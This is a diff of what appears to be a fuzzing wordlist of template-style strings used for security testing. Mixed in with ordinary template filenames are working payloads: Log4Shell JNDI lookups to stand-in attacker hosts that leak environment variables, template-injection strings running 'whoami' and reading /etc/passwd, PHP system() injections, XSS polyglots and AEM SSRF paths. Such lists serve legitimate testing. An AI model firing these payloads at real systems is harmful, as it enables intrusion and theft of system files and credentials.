@@ -48,7 +48,6 @@ ${empty}clouddataservicecontext.xml
 ${empty}servicecontext.xml
 ${entityname}mapper.xml
 ${genname}mapper.xml
-${idfwbonavigation}.xml
 ${j${k8s:k5:-nd}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o} - aws firewall bypass
 ${jndi:dns://attacker.com/a}
 ${jndi:ldap://${env:user}.xyz.collab.com/a} - default payload
@@ -100,8 +99,6 @@ ${{<%[%'"}}%\
 - "#{name.last_name}-#{name.last_name}"
 - "#{prefix} #{first_name} #{last_name}"
 -@{.vtjjzkjvm0dgx#pa{r
-/ libs / opensocial / makerequest {0}? url = {{0}}
-/ libs / opensocial / proxy {0}? container = default & url = {{0}}
 /*/%7b%7burl%20absolute=
 /.putty/{{hostname}}.ppk
 /.ssh/{{hostname}}.ppk
@@ -319,8 +316,6 @@ ${{<%[%'"}}%\
 @{[system "touch /tmp/blns.fail"]}
 @{c:\windows\winstore\resources.pri?ms-resource://winstore/resources/displayname}
 @{{7*7}}
-@{{{{{{{
-@{{{{{{{{{{{
 a=`${alert/*}`;
 application-${clazz.classname}.xml.ftl
 application-${clazz.classname}.xml.ftl.svn-base
@@ -329,20 +324,16 @@ application-${modulename}.xml.ftl.2.tmp
 application-${modulename}.xml.ftl.svn-base
 application-${modulename}.xml.ftl.tmp
 arraylength=${#paramsarray[*]}
-bin/wcm/contentfinder/connector/suggestions.json;%0aojh.css?query_term=path%3a/&pre={{randstr}}
 blog/*/{{ad_click_url}}
 cat ${home:0:1}etc${home:0:1}passwd
-cat$ifs$9${pwd%%[a-z]*}e*c${pwd%%[a-z]*}p?ss??
 char1=`echo "${uriinputdecode:(i+4):1}"`
 char2=`echo "${uriinputdecode:(i+5):1}"`
 char=`echo "${input:i:1}"`
 char=`echo "${uriinputdecode:i:1}"`
 char=`echo "${uriinputencode:i:1}"`
-charts/wizard/url.php?${phpinfo()}=1
 code: {{.ecode}}
 codegenerator-boss/template/springmvc_rest/web/pages/${classnamelowercase}/show.jsp
 confirm`1`; var something = `abc${confirm(1)}def`; ``.constructor.constructor`confirm\`1\````;
-dashboard/snapshot/%7b%7bconstructor.constructor(%27alert(document.domain)%27)()%7d%7d?orgid=1
 en-gb.com_{{name}}.ini
 en-gb.com_{{name}}.sys.ini
 en-gb.{{extension.element.lower}}.core.ini
@@ -358,13 +349,10 @@ firstchar="${payload:1:1}"
 for paramstring in ${paramsarray[*]}; do
 freelance-hspszhp/${deploy_dir}/${war.name.gdpos}/widget_report.jsp
 function`$${`a${`l${`e${`r${`t${`(${`1${`)`}`}`}`}`}`}`}`}$```
-giftcard/terms/{{item.link}}
 if [ true = "$z" ] ; then echo "debug! paramsarray at y: " ${paramsarray[$y]};fi
 if [ true = "$z" ] ; then echo "debug! paramsarray: "${paramsarray[*]}; fi
 index.php/module/action/param1/${@die(md5(hellothinkphp))}
 index.php?s=/module/action/param1/${@die(md5(hellothinkphp))}
-infusions/downloads/downloads.php?cat_id=${system(cat /etc/passwd)}
-infusions/downloads/downloads.php?cat_id=${system(ls)}
 intext:{{szerrortip}} inurl:/doc/page/login.asp
 itm/*/%7b%7b
 javascript://%250aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></title/</style/</script/</textarea/</iframe/</noscript>\74k<k/contenteditable/autofocus/onfocus=/*${/*/;{/**/(alert)(1)}//><base/href=//x55.is\76-->
@@ -405,11 +393,6 @@ libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.css?url={{0}}
 libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.html?url={{0}}%23/blog.zsec.uk/a&q=a
 libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.js?url={{0}}%23/blog.zsec.uk/a&q=a
 libs/cq/contentinsight/content/proxy.reportingservices.json;%0a{0}.png?url={{0}}%23/blog.zsec.uk/a&q=a
-libs/cq/contentinsight/content/proxy.reportingservices.json;0a{0}.bmp?url={{0}}23/blog.zsec.uk/a&q=a
-libs/cq/contentinsight/content/proxy.reportingservices.json;0a{0}.css?url={{0}}23/blog.zsec.uk/a&q=a
-libs/cq/contentinsight/content/proxy.reportingservices.json;0a{0}.ico?url={{0}}23/blog.zsec.uk/a&q=a
-libs/cq/contentinsight/content/proxy.reportingservices.json;0a{0}.js?url={{0}}23/blog.zsec.uk/a&q=a
-libs/cq/contentinsight/content/proxy.reportingservices.json;0a{0}.png?url={{0}}23/blog.zsec.uk/a&q=a
 libs/cq/contentinsight/proxy/reportingservices.json.get.servlet.{0}.bmp?url={{0}}%23/blog.zsec.uk/a&q=a
 libs/cq/contentinsight/proxy/reportingservices.json.get.servlet.{0}.css?url={{0}}%23/blog.zsec.uk/a&q=a
 libs/cq/contentinsight/proxy/reportingservices.json.get.servlet.{0}.html?url={{0}}%23/blog.zsec.uk/a&q=a
@@ -463,7 +446,6 @@ plugins/struts2/template/web/${namespace}/${classname}/edit.jsp
 plugins/struts2/template/web/${namespace}/${classname}/form_include.jsp
 plugins/struts2/template/web/${namespace}/${classname}/list.jsp
 plugins/struts2/template/web/${namespace}/${classname}/show.jsp
-products/{{item.link}}
 prompt`${document.domain}`
 q@{{tk5}}0p
 search?search_key={{1337*1338}}
@@ -512,7 +494,6 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
 {% import "os" %}{{ os.popen("whoami").read() }}
 {@pnv@{veq#nn_%t(gopb2]-caskjp{jxh!nvodz.{j9h2a$n0
-{@{{{{{{
 {{ ''.__class__.__mro__ }}
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 {{ '7'*7 }}
@@ -529,11 +510,6 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{ oidc_playground_jwt_secret }}
 {{ request }}
 {{ self.template.module.os.popen('whoami').read() }}
-{{ theme sanitized }}.behaviors.js
-{{ theme sanitized }}.hacks.scss
-{{ theme sanitized }}.no-query.scss
-{{ theme sanitized }}.normalize.scss
-{{ theme sanitized }}.styles.scss
 {{# 7*7 }}
 {{$eval.constructor('alert(1)')()}}
 {{$i}}: {{$frame.function}}
@@ -555,7 +531,6 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{= tnn96}}
 {{=42*42}}
 {{=machine}}.conf
-{{@{{{{{
 {{['cat$ifs/etc/passwd']|filter('system')}}
 {{['cat\x20/etc/passwd']|filter('system')}}
 {{['id']|filter('system')}}
@@ -580,9 +555,6 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{cookiecutter.project_slug}}
 {{cookiecutter.project_slug}}_datamodel.xml
 {{cookiecutter.repo_name}}
-{{cookiecutter.repo_name}}/{{cookiecutter.repo_name}}/templates/404.html
-{{cookiecutter.repo_name}}/{{cookiecutter.repo_name}}/templates/500.html
-{{cookiecutter.repo_name}}/{{cookiecutter.repo_name}}/templates/base.html
 {{cookiecutter.stem_name}}.xml
 {{cookiecutter.stem_name}}_build.xml
 {{cycler.__init__.__globals__.os}}
@@ -634,8 +606,5 @@ zh-tw.{{extension.element.lower}}.{{controller.item.name.lower}}.ini
 {{url}}
 {{{42*42}}}
 {{{7*7}}}
-{{{{@{{{
-{{{{@{{{{{{{
-{{{{{@{{{{{{
 {{{}.tostring.constructor('confirm(1)')()}}
 }aj;5a&hl@{z
